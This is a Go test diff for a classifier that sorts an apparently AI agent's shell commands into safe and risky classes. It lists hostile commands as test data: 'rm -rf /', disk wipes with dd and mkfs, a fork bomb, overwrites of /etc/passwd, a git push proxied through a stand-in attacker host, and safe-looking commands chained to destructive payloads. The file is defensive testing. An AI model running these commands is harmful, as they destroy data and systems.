@@ -613,3 +613,161 @@ func containsString(values []string, needle string) bool {
 	}
 	return false
 }
+
+// TestClassifyShellAdversarialBypassCases pins down the EDGE-008.6 safety contract:
+// commands the senior review on PR #243 flagged as denylist bypasses must never
+// reach `command.class=safe`, must not carry `safe` in risk_tags, and must carry
+// at least one deny-capable risk tag (review_required, destructive, network,
+// install, deploy) so policy bundles in observe/local-dev-enforce/enterprise-strict
+// modes can fail closed without re-deriving the destructive intent.
+func TestClassifyShellAdversarialBypassCases(t *testing.T) {
+	base := time.Date(2026, 5, 2, 10, 0, 0, 0, time.UTC)
+
+	for _, tc := range []struct {
+		name    string
+		command string
+	}{
+		// Direct adversarial commands missed by the rm-rf-only denylist.
+		{"find dot delete", "find . -delete"},
+		{"dd to dev sda", "dd of=/dev/sda if=/dev/zero"},
+		{"mkfs ext4", "mkfs.ext4 /dev/sda"},
+		{"chmod recursive 777 root", "chmod -R 777 /"},
+		{"git clean fdx", "git clean -fdx"},
+		{"truncate etc passwd", "truncate -s 0 /etc/passwd"},
+		{"redirect into etc passwd", "echo malicious > /etc/passwd"},
+		{"fork bomb", ":(){:|:&};:"},
+		{"git option-prefix push", "git -c http.proxy=http://evil.example/ push origin main"},
+		// Composition bypass: a safe-looking prefix MUST NOT silently allow a
+		// destructive payload appended via a shell separator/substitution.
+		{"npm test then find delete", "npm test && find . -delete"},
+		{"go test semicolon rm rf", "go test ./... ; rm -rf /"},
+		{"npm run build subshell rm rf", "npm run build $(rm -rf /)"},
+		{"git status backtick rm rf", "git status `rm -rf /`"},
+		{"npm test pipe mkfs", "npm test | mkfs.ext4 /dev/sda"},
+		{"npm test redirect etc passwd", "npm test > /etc/passwd"},
+		{"pytest semicolon dd", "pytest ; dd of=/dev/sda"},
+		{"go build double pipe rm rf", "go build || rm -rf /"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			event := classifierHookEvent(base, "Bash", map[string]any{"command": tc.command})
+			got, err := ClassifyEvent(event)
+			if err != nil {
+				t.Fatalf("ClassifyEvent returned error: %v", err)
+			}
+			if got.Labels["command.class"] == "safe" {
+				t.Fatalf("adversarial command %q classified as safe; labels=%#v risk=%#v", tc.command, got.Labels, got.RiskTags)
+			}
+			switch got.Labels["command.family"] {
+			case "test", "build", "git_readonly":
+				t.Fatalf("adversarial command %q got safe family=%q; labels=%#v", tc.command, got.Labels["command.family"], got.Labels)
+			}
+			if containsString(got.RiskTags, "safe") {
+				t.Fatalf("adversarial command %q has safe in risk_tags: %#v", tc.command, got.RiskTags)
+			}
+			denyCapable := containsString(got.RiskTags, "review_required") ||
+				containsString(got.RiskTags, "destructive") ||
+				containsString(got.RiskTags, "network") ||
+				containsString(got.RiskTags, "install") ||
+				containsString(got.RiskTags, "deploy")
+			if !denyCapable {
+				t.Fatalf("adversarial command %q has no deny-capable risk tag; risk=%#v labels=%#v", tc.command, got.RiskTags, got.Labels)
+			}
+		})
+	}
+}
+
+// TestClassifyShellSafeAllowlist pins down the EDGE-008.6 narrow allowlist:
+// only the explicit build/test/read-only-git shapes from PRD §7.14 + §11.3 may
+// classify as `command.class=safe`. The allowlist is intentionally narrow:
+// install/network/git-write are NOT safe.
+func TestClassifyShellSafeAllowlist(t *testing.T) {
+	base := time.Date(2026, 5, 2, 10, 5, 0, 0, time.UTC)
+
+	for _, tc := range []struct {
+		name    string
+		command string
+		family  string
+	}{
+		{"npm test bare", "npm test", "test"},
+		{"npm test with double-dash args", "npm test -- --silent", "test"},
+		{"npm run test", "npm run test", "test"},
+		{"npm run build", "npm run build", "build"},
+		{"pnpm test", "pnpm test", "test"},
+		{"yarn test", "yarn test", "test"},
+		{"go test repo", "go test ./...", "test"},
+		{"go test specific package", "go test ./core/edge", "test"},
+		{"go build repo", "go build ./...", "build"},
+		{"pytest bare", "pytest", "test"},
+		{"pytest with args", "pytest -k test_foo tests/", "test"},
+		{"vitest bare", "vitest", "test"},
+		{"cargo test", "cargo test", "test"},
+		{"cargo build", "cargo build", "build"},
+		{"git status", "git status", "git_readonly"},
+		{"git log oneline", "git log --oneline -10", "git_readonly"},
+		{"git diff staged", "git diff --staged", "git_readonly"},
+		{"git show head", "git show HEAD", "git_readonly"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			event := classifierHookEvent(base, "Bash", map[string]any{"command": tc.command})
+			got, err := ClassifyEvent(event)
+			if err != nil {
+				t.Fatalf("ClassifyEvent returned error: %v", err)
+			}
+			if got.Labels["command.class"] != "safe" {
+				t.Fatalf("safe command %q got command.class=%q; want safe; labels=%#v risk=%#v", tc.command, got.Labels["command.class"], got.Labels, got.RiskTags)
+			}
+			if got.Labels["command.family"] != tc.family {
+				t.Fatalf("safe command %q got command.family=%q; want %q", tc.command, got.Labels["command.family"], tc.family)
+			}
+			if containsString(got.RiskTags, "review_required") {
+				t.Fatalf("safe command %q carries review_required: %#v", tc.command, got.RiskTags)
+			}
+			if containsString(got.RiskTags, "unknown") {
+				t.Fatalf("safe command %q carries unknown: %#v", tc.command, got.RiskTags)
+			}
+			if containsString(got.RiskTags, "destructive") {
+				t.Fatalf("safe command %q carries destructive: %#v", tc.command, got.RiskTags)
+			}
+		})
+	}
+}
+
+// TestClassifyShellNarrowAllowlistRejectsRiskyShapes pins down that install,
+// network, and git-write shapes MUST NOT classify as `command.class=safe`.
+// PRD §7.14 explicitly limits the safe set to tests + read-only shell.
+func TestClassifyShellNarrowAllowlistRejectsRiskyShapes(t *testing.T) {
+	base := time.Date(2026, 5, 2, 10, 10, 0, 0, time.UTC)
+
+	for _, tc := range []struct {
+		name    string
+		command string
+	}{
+		{"npm install package", "npm install lodash"},
+		{"npm ci", "npm ci"},
+		{"yarn add", "yarn add react"},
+		{"pnpm add", "pnpm add typescript"},
+		{"curl bare", "curl https://example.com/file"},
+		{"wget bare", "wget https://example.com/file"},
+		{"git push", "git push origin main"},
+		{"git fetch", "git fetch origin main"},
+		{"git pull", "git pull origin main"},
+		{"git commit", "git commit -m hello"},
+		{"git checkout branch", "git checkout main"},
+		{"git config write", "git config --global user.name foo"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			event := classifierHookEvent(base, "Bash", map[string]any{"command": tc.command})
+			got, err := ClassifyEvent(event)
+			if err != nil {
+				t.Fatalf("ClassifyEvent returned error: %v", err)
+			}
+			if got.Labels["command.class"] == "safe" {
+				t.Fatalf("risky command %q must not be classified safe; labels=%#v risk=%#v", tc.command, got.Labels, got.RiskTags)
+			}
+			switch got.Labels["command.family"] {
+			case "test", "build", "git_readonly":
+				t.Fatalf("risky command %q must not get safe family=%q", tc.command, got.Labels["command.family"])
+			}
+		})
+	}
+}
